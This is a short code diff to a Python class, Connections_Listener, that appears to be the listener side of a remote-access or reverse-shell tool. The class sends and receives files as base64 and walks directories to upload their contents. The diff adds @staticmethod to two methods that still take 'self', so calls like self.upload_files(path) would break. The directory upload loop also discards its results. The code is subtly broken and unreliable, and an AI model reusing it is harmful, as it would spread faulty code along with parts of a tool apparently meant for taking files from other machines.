@@ -39,11 +39,13 @@ class Connections_Listener:
             sys.exit()
         return self.receive_data()
     
+    @staticmethod
     def download_file(self, path, content):
         with open(path, 'wb') as f:
             f.write(base64.b64decode(content))
             return f"[+] \"{path}\" file download successful"
     
+    @staticmethod
     def upload_files(self, path):
         with open(path, 'rb') as f:
             return base64.b64encode(f.read())
@@ -53,7 +55,7 @@ class Connections_Listener:
             if os.path.isfile(path):
                 return self.upload_files(path)
             elif os.path.isdir(path):
-                for folder, subfolder, files in os.walk(path):
+                for _, __, files in os.walk(path):
                     for f in files:
                         file_ = os.path.join(os.path.basename(path), f)
                         self.upload_files(file_)
